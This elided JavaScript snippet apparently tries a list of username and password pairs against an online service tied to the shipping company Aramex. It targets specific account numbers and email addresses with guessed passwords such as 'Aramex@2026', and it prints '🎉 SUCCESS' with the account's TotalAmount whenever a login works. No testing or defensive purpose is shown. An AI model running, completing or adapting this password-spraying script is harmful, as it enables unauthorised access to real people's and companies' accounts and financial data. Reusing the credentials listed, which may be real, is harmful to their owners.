...
const tests = [
  ...
  { user: "75788705", pass: "217147" },
  { user: "75788705@aramex.com", pass: "#JohnSnow2027" },
  { user: "care@trsh.ae", pass: "217147" },
  { user: "care@trsh.ae", pass: "Aramex@2026" },
  { user: "care@trsh.ae", pass: "Aramex@2025" },
  { user: "care@trsh.ae", pass: "Aramex123" }
];
...
async function run() {
  for (const t of tests) {
    ...
    if (res.data && !res.data.HasErrors) {
      console.log("🎉 SUCCESS FOR USER/PASS:", t.user, t.pass, JSON.stringify(res.data.TotalAmount));
    }
  }
}
